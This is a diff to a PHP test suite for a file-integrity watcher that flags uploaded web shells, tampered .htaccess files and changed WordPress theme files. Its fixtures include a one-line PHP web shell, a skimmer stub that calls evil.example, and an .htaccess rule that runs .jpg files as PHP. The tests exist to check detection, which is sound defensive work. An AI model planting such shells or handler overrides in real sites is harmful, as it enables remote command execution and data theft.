@@ -252,7 +252,6 @@ class FileWatchTest extends TestCase
         $this->write('storage/app/public/news/000/000012/shell.php', '<?php system($_GET["c"]);', 3);
         $this->write('storage/app/public/news/000/000012/photo.jpg', 'jpeg', 3);
         $this->write('storage/app/public/news/000/000012/manual.pdf', 'pdf', 3);
-        $this->write('storage/app/public/.htaccess', 'AddHandler php-script .jpg', 3);
         $this->write('storage/app/public/.gitignore', '*', 3);
         $this->write('storage/app/public/campaign/skimmer.js', 'fetch("https://evil.example")', 3);
         $this->write('storage/app/public/campaign/index.html', '<script></script>', 3);
@@ -266,7 +265,6 @@ class FileWatchTest extends TestCase
         $result = $this->checkAt(5);
         $this->assertSame(
             [
-                'storage/app/public/.htaccess',
                 'storage/app/public/campaign/index.html',
                 'storage/app/public/campaign/logo.svg',
                 'storage/app/public/campaign/skimmer.js',
@@ -279,6 +277,78 @@ class FileWatchTest extends TestCase
         // 運用で置く拡張子は、設定に足せば知らせない
         config(['neobit.file_watch.public_upload_extra' => ['svg']]);
         $this->assertNotContains('storage/app/public/campaign/logo.svg', array_column($this->checkAt(10)['dangers'], 'label'));
+    }
+
+    public function test_wordpress_uploads_are_checked_like_the_upload_place(): void
+    {
+        // WordPressを置く前の基準に、アップロードとキャッシュのファイルが入っている
+        $this->write('public/wp-content/uploads/2026/10/old.jpg', 'jpeg', -1440);
+        $this->write('public/wp-content/cache/page.html', '<html>', -1440);
+        $this->write('public/wp-content/themes/neobit/style.css', 'body{}', -1440);
+        $this->watcher()->init();
+
+        config(['neobit.wordpress' => [
+            'gate' => 'prepend',
+            'upload_path' => 'public/wp-content/uploads',
+            'watch_exclude' => ['public/wp-content/cache'],
+        ]]);
+
+        // アップロードの画像とキャッシュの書き換えは知らせない。前の基準のものも、消えたものにしない
+        File::delete($this->base.'/public/wp-content/uploads/2026/10/old.jpg');
+        $this->write('public/wp-content/uploads/2026/10/photo.jpg', 'jpeg', 3);
+        $this->write('public/wp-content/cache/page.html', '<html>new', 3);
+        $this->write('public/wp-content/uploads/2026/10/shell.php', '<?php', 3);
+
+        // テーマの書き換えは、今までどおり知らせる
+        $this->write('public/wp-content/themes/neobit/style.css', 'body{x}', 3);
+
+        $result = $this->checkAt(30);
+        $this->assertSame(['public/wp-content/themes/neobit/style.css'], array_column($result['alerts'], 'label'));
+        $this->assertSame(['public/wp-content/uploads/2026/10/shell.php'], array_column($result['dangers'], 'label'));
+    }
+
+    public function test_htaccess_in_the_upload_places_is_compared_with_the_baseline(): void
+    {
+        config(['neobit.wordpress' => [
+            'gate' => 'prepend',
+            'upload_path' => 'public/wp-content/uploads',
+            'watch_exclude' => [],
+        ]]);
+
+        // 鍵と一緒に置いた.htaccessは、通常の更新として基準に取り込む（プラグインを入れたときなど）
+        $this->write('public/wp-content/uploads/wc-logs/.htaccess', 'deny from all', 2);
+        $this->write('.version', 'deploy', 3);
+        $result = $this->checkAt(5);
+        $this->assertSame([1, [], []], [$result['accepted'], $result['alerts'], $result['dangers']]);
+
+        // 鍵の無い追加と書き換えは、どちらの置き場所でも改ざんとして知らせる。すぐ知らせる危ないファイルにはしない
+        $this->write('storage/app/public/.htaccess', 'AddHandler php-script .jpg', 60);
+        $this->write('public/wp-content/uploads/wc-logs/.htaccess', 'AddHandler php-script .jpg', 60);
+        $result = $this->checkAt(61);
+        $this->assertSame([2, [], []], [$result['pending'], $result['alerts'], $result['dangers']]);
+
+        $result = $this->checkAt(80);
+        $this->assertSame(
+            [['public/wp-content/uploads/wc-logs/.htaccess', 'changed'], ['storage/app/public/.htaccess', 'added']],
+            array_map(fn (array $alert) => [$alert['label'], $alert['kind']], $result['alerts']),
+        );
+    }
+
+    public function test_old_baseline_takes_in_existing_htaccess_quietly(): void
+    {
+        // 前の版の基準には、アップロードの置き場所の.htaccessが入っていない。最初の回だけは知らせずに取り込む
+        $this->write('storage/app/public/.htaccess', 'deny from all', -1440);
+        $path = $this->base.'/bootstrap/cache/file-watch.json';
+        $state = json_decode((string) file_get_contents($path), true);
+        unset($state['upload_config']);
+        file_put_contents($path, json_encode($state));
+
+        $this->assertSame([], $this->checkAt(20)['alerts']);
+        $this->assertArrayHasKey('storage/app/public/.htaccess', json_decode((string) file_get_contents($path), true)['files']);
+
+        // 次からは、書き換えを知らせる
+        $this->write('storage/app/public/.htaccess', 'AddHandler php-script .jpg', 30);
+        $this->assertSame(['storage/app/public/.htaccess'], array_column($this->checkAt(50)['alerts'], 'label'));
     }
 
     public function test_vendor_and_cache_are_watched_only_where_they_should_be(): void
